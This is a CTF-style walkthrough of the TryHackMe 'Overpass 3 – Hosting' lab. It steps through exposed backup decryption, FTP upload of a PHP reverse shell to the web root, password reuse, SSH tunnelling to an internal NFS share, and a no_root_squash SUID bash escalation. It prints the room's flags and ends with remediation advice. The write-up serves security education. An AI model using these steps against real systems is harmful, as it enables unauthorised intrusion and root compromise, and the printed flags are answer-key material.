# TryHackMe – Overpass 3: Hosting

> **Platform:** TryHackMe  
> **Room:** Overpass 3 – Hosting  
> **Difficulty:** Medium  
> **Category:** Web Exploitation / Linux Privilege Escalation  
> **Objective:** Obtain the Web, User, and Root flags.

---

## 1. Overview

**Overpass 3 – Hosting** is the final room in the Overpass series.

The machine exposes an FTP server, SSH, and an Apache web server. The initial attack path starts with web enumeration, where a publicly accessible backup contains an encrypted customer database and the private key required to decrypt it.

The recovered credentials allow access to the FTP service. Since the FTP directory is also served by Apache and permits file uploads, a PHP reverse shell can be uploaded and executed.

After obtaining an `apache` shell, the recovered credentials can be reused to switch to the `paradox` user.

Further enumeration reveals an internally accessible NFS service exporting `/home/james` with `no_root_squash`. Because NFS is not directly exposed externally, SSH tunneling is used to access it.

The mounted NFS share exposes the `james` user's SSH private key and the User flag. Finally, because `no_root_squash` allows files created by the attacker's root user to retain root ownership, a SUID-enabled Bash binary can be placed in James' home directory and executed to obtain a root shell.

### Attack Chain

```text
HTTP Enumeration
       │
       ▼
/backups/backup.zip
       │
       ▼
GPG Private Key + Encrypted XLSX
       │
       ▼
Recovered Credentials
       │
       ▼
FTP Login as paradox
       │
       ▼
Writable Web Root
       │
       ▼
PHP Reverse Shell
       │
       ▼
apache
       │
       ▼
su → paradox
       │
       ▼
NFS /home/james
       │
       ▼
SSH Tunnel
       │
       ▼
Mount NFS Share
       │
       ├── user.flag
       └── james SSH private key
                    │
                    ▼
               SSH as james
                    │
                    ▼
          SUID /bin/bash via NFS
                    │
                    ▼
                  root
```

---

# 2. Reconnaissance

I started by performing a full TCP port scan against the target.

```bash
nmap -sC -sV -p- <TARGET_IP>
```

The important exposed services were:

| Port | Service | Version |
|---:|---|---|
| 21 | FTP | vsFTPd 3.0.3 |
| 22 | SSH | OpenSSH 8.0 |
| 80 | HTTP | Apache 2.4.37 |

The same service layout is documented in independent room walkthroughs.

Since SSH credentials were not initially available, I focused on the HTTP and FTP services.

---

# 3. Web Enumeration

Opening the web server showed the Overpass Hosting website.

I also inspected the HTML source:

```bash
curl http://<TARGET_IP>
```

The source contained an interesting comment referencing **"5 nines"**. While this did not directly provide access, it demonstrated that the source code contained information not visible in the rendered page.

Next, I performed directory enumeration:

```bash
gobuster dir \
-u http://<TARGET_IP> \
-w /usr/share/wordlists/dirb/common.txt
```

The most interesting discovery was:

```text
/backups/
```

Browsing the directory revealed:

```text
backup.zip
```

---

# 4. Downloading and Extracting the Backup

I downloaded the archive:

```bash
wget http://<TARGET_IP>/backups/backup.zip
```

Then extracted it:

```bash
unzip backup.zip
```

The archive contained:

```text
CustomerDetails.xlsx.gpg
priv.key
```

This was a major finding.

The backup contained both:

- an encrypted customer database
- the private GPG key required to decrypt it

This is a serious information-disclosure issue because storing the encryption key alongside encrypted sensitive data defeats much of the protection provided by encryption.

---

# 5. GPG Decryption

First, I imported the private key:

```bash
gpg --import priv.key
```

Then decrypted the database:

```bash
gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
```

I verified the resulting file:

```bash
file CustomerDetails.xlsx
```

The file was a Microsoft Excel spreadsheet containing customer information and credentials.

The important information recovered from the spreadsheet included usernames and passwords.

One particularly useful account was:

```text
Username: paradox
Password: <RECOVERED_FROM_SPREADSHEET>
```

---

# 6. FTP Enumeration

The next step was testing the recovered credentials against FTP.

Anonymous FTP access was not available, so I used the recovered `paradox` credentials:

```bash
ftp <TARGET_IP>
```

After authentication:

```text
230 Login successful.
```

I enumerated the directory:

```ftp
ls -la
```

The FTP directory contained the same web content served by Apache.

This was important because it suggested that files uploaded through FTP could potentially become accessible through HTTP.

---

# 7. Testing FTP File Upload

I first tested whether the FTP account had write permissions.

I created a simple PHP file:

```php
<?php
echo "It works";
?>
```

Then uploaded it:

```ftp
put test.php
```

The upload succeeded.

I then accessed:

```text
http://<TARGET_IP>/test.php
```

The PHP code executed successfully.

This confirmed the critical relationship:

```text
FTP upload
     ↓
Web root
     ↓
Apache
     ↓
PHP execution
```

Therefore, arbitrary PHP code could potentially be executed remotely.

---

# 8. Initial Foothold – PHP Reverse Shell

I prepared a PHP reverse shell and configured it to connect back to my attacker machine.

For example, using the Kali Linux PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

I configured the callback IP and port inside the PHP script.

Then started a listener:

```bash
nc -lvnp 4444
```

After uploading the PHP reverse shell through FTP:

```ftp
put php-reverse-shell.php
```

I triggered it through the web server:

```text
http://<TARGET_IP>/php-reverse-shell.php
```

The listener received a connection.

I verified the compromised account:

```bash
whoami
```

Output:

```text
apache
```

The initial foothold was therefore obtained as the Apache service account.

---

# 9. Obtaining the Web Flag

After obtaining the shell, I searched the filesystem for the web flag:

```bash
find / -name "web.flag" 2>/dev/null
```

The flag was located under the Apache web directory.

Reading it:

```bash
cat /usr/share/httpd/web.flag
```

### Web Flag

```text
thm{0ae72f7870c3687129f7a824194be09d}
```

---

# 10. Escalating from apache → paradox

The credentials obtained from the decrypted spreadsheet were also valid for the local `paradox` account.

I tested the credentials with:

```bash
su paradox
```

After entering the recovered password:

```bash
whoami
```

Output:

```text
paradox
```

This demonstrated **password reuse** between the FTP service and the local system account.

An SSH login using the password was not possible because the SSH configuration required public-key authentication.

---

# 11. Linux Privilege Enumeration

At this stage, I performed further enumeration from the `paradox` account.

A useful enumeration tool is LinPEAS:

```bash
./linpeas.sh
```

The enumeration revealed an important NFS configuration involving:

```text
/home/james
```

with:

```text
no_root_squash
```

---

# 12. Understanding the NFS Misconfiguration

The critical vulnerability was the combination of:

```text
NFS export
+
no_root_squash
```

Normally, NFS can map remote root privileges to an unprivileged account through root squashing.

With `no_root_squash`, however, root privileges from the NFS client are not squashed.

This means an attacker who mounts the share as root can create files that retain:

```text
UID 0
```

and therefore appear as owned by `root` on the target.

The room's NFS configuration specifically enables this privilege-escalation path.

---

# 13. Discovering the Internal NFS Service

The NFS service was not directly reachable from the attacker machine.

I checked the target's localhost port:

```bash
(echo > /dev/tcp/127.0.0.1/2049) >/dev/null 2>&1
echo $?
```

A return value of:

```text
0
```

indicated that TCP port `2049` was accessible locally.

Port `2049` is commonly used by NFS.

Therefore, the problem became:

```text
Attacker
   X
   │
   │  NFS 2049 blocked externally
   │
Target localhost:2049
```

I needed a tunnel.

---

# 14. SSH Port Forwarding

Since I had access as `paradox`, I could use SSH tunneling.

One approach is to forward local port `2049` to the target's local NFS service:

```bash
ssh -N -L 2049:127.0.0.1:2049 paradox@<TARGET_IP>
```

Now the attacker machine could access:

```text
localhost:2049
```

which was forwarded to:

```text
TARGET:127.0.0.1:2049
```

Another valid approach is using Chisel for the same purpose. The room has been solved using both SSH tunneling and Chisel in published walkthroughs.

---

# 15. Mounting the NFS Share

I created a mount point:

```bash
mkdir /tmp/overpass
```

Then mounted the NFS share:

```bash
sudo mount -t nfs localhost:/ /tmp/overpass
```

I inspected the mounted filesystem:

```bash
ls -la /tmp/overpass
```

The mounted filesystem corresponded to the exported `/home/james` directory.

---

# 16. Obtaining the User Flag

The mounted directory contained:

```text
user.flag
```

I read it:

```bash
cat /tmp/overpass/user.flag
```

### User Flag

```text
thm{3693fc86661faa21f16ac9508a43e1ae}
```

This confirmed successful access to James' home directory.

---

# 17. Obtaining James' SSH Private Key

While inspecting the mounted filesystem, I found:

```text
/tmp/overpass/.ssh/id_rsa
```

I copied the private key to my attacker machine:

```bash
cp /tmp/overpass/.ssh/id_rsa ./james_id_rsa
```

Then restricted its permissions:

```bash
chmod 600 james_id_rsa
```

I could now authenticate to the target as James:

```bash
ssh -i james_id_rsa james@<TARGET_IP>
```

After login:

```bash
whoami
```

Output:

```text
james
```

The attack path had now progressed from:

```text
apache
   ↓
paradox
   ↓
james
```

---

# 18. Exploiting no_root_squash

Now the NFS misconfiguration could be used for privilege escalation.

Because the NFS share was mounted locally with `no_root_squash`, files created as root on the attacker-side mounted filesystem could retain root ownership on the target.

I copied Bash into James' home directory:

```bash
sudo cp /bin/bash /tmp/overpass/bash
```

Then enabled the SUID bit:

```bash
sudo chmod +s /tmp/overpass/bash
```

I verified the permissions:

```bash
ls -l /tmp/overpass/bash
```

The important part was:

```text
-rwsr-xr-x
```

The `s` indicates that the SUID bit was set.

Because the file was owned by root, executing it as James would cause Bash to run with the file owner's effective privileges.

---

# 19. Obtaining Root

I connected to the machine as James:

```bash
ssh -i james_id_rsa james@<TARGET_IP>
```

Then executed the SUID Bash binary:

```bash
./bash -p
```

The `-p` option preserves the effective privileges.

I verified the resulting shell:

```bash
whoami
```

Output:

```text
root
```

The machine was now fully compromised.

---

# 20. Root Flag

Finally:

```bash
cat /root/root.flag
```

### Root Flag

```text
thm{a4f6adb70371a4bceb32988417456c44}
```

---

# 21. Complete Attack Path

The complete exploitation chain was:

```text
1. Nmap
   ↓
2. Discover FTP / SSH / HTTP
   ↓
3. Enumerate HTTP
   ↓
4. Discover /backups/
   ↓
5. Download backup.zip
   ↓
6. Extract priv.key + encrypted XLSX
   ↓
7. Decrypt XLSX using GPG private key
   ↓
8. Recover paradox credentials
   ↓
9. Login to FTP
   ↓
10. Discover FTP directory is the web root
   ↓
11. Confirm PHP execution
   ↓
12. Upload PHP reverse shell
   ↓
13. Obtain apache shell
   ↓
14. Read web.flag
   ↓
15. su → paradox
   ↓
16. Enumerate with LinPEAS
   ↓
17. Discover NFS + no_root_squash
   ↓
18. Forward NFS port 2049
   ↓
19. Mount /home/james
   ↓
20. Read user.flag
   ↓
21. Obtain james SSH private key
   ↓
22. SSH as james
   ↓
23. Copy /bin/bash to NFS share
   ↓
24. Set SUID
   ↓
25. Execute ./bash -p
   ↓
26. root
   ↓
27. Read root.flag
```

---

# 22. Vulnerabilities Identified

## 22.1 Sensitive Backup Exposure

The `/backups/` directory was publicly accessible.

It exposed:

```text
backup.zip
```

The archive contained sensitive customer information and the private key required to decrypt it.

### Recommendation

- Do not expose backup directories through the web server.
- Store backups outside the web root.
- Keep encryption keys separate from encrypted data.
- Restrict access to backup files.

---

## 22.2 FTP and Local Password Reuse

The password recovered from the customer database worked for the `paradox` local account.

### Recommendation

- Never reuse passwords across services.
- Enforce strong password policies.
- Use MFA where possible.
- Store credentials securely.

---

## 22.3 Arbitrary File Upload + PHP Execution

The FTP account could upload files into a directory served by Apache.

PHP files were also executed by the web server.

This resulted in remote code execution.

### Recommendation

- Separate FTP storage from the web root.
- Restrict write permissions.
- Disable script execution in upload directories.
- Validate uploaded file types.
- Use least-privilege service accounts.

---

## 22.4 NFS `no_root_squash`

The most critical privilege-escalation issue was the NFS export configured with:

```text
no_root_squash
```

This allowed root privileges from the NFS client to be preserved on the exported filesystem.

### Recommendation

Replace insecure NFS export options with appropriate root squashing:

```text
root_squash
```

and restrict which hosts are allowed to mount the share.

---

# 23. Lessons Learned

This room demonstrated several important penetration-testing concepts:

### Enumeration

Never focus only on the obvious service.

The website looked simple, but directory enumeration revealed the backup archive that ultimately provided the credentials.

### Information Disclosure

Encryption does not provide meaningful protection if the private key is stored next to the encrypted data.

### Attack Chaining

No single weakness was necessarily enough to completely compromise the machine.

The compromise resulted from chaining several issues:

```text
Information Disclosure
        +
Credential Reuse
        +
FTP Write Access
        +
PHP Execution
        +
NFS Misconfiguration
        +
SSH Key Exposure
        +
SUID Bash
        =
Complete System Compromise
```

### Privilege Escalation

The NFS `no_root_squash` configuration was the key privilege-escalation vulnerability.

Understanding **why** the misconfiguration works is more important than simply memorizing the commands.

---

# 24. Flags

| Flag | Value |
|---|---|
| Web | `thm{0ae72f7870c3687129f7a824194be09d}` |
| User | `thm{3693fc86661faa21f16ac9508a43e1ae}` |
| Root | `thm{a4f6adb70371a4bceb32988417456c44}` |

---

# 25. Conclusion

Overpass 3 – Hosting was a good demonstration of how multiple low-to-medium severity weaknesses can be chained into complete system compromise.

The most important lessons from the room were:

- Perform comprehensive enumeration.
- Inspect source code and hidden directories.
- Never expose backups through a web server.
- Keep encryption keys separate from encrypted data.
- Avoid password reuse.
- Treat writable web directories as a critical attack surface.
- Enumerate local services after obtaining a foothold.
- Understand NFS security and `no_root_squash`.
- Investigate SSH keys exposed through mounted filesystems.
- Always verify privileges with commands such as `id` and `whoami`.

**Final result: Root access obtained.**

---

## Disclaimer  
This write-up documents exploitation performed against the intentionally vulnerable TryHackMe Overpass 3 – Hosting lab environment and is intended for educational and authorized security-testing purposes only.

This write-up documents exploitation performed against the intentionally vulnerable **TryHackMe Overpass 3 – Hosting** lab environment and is intended for educational and authorized security-testing purposes only.
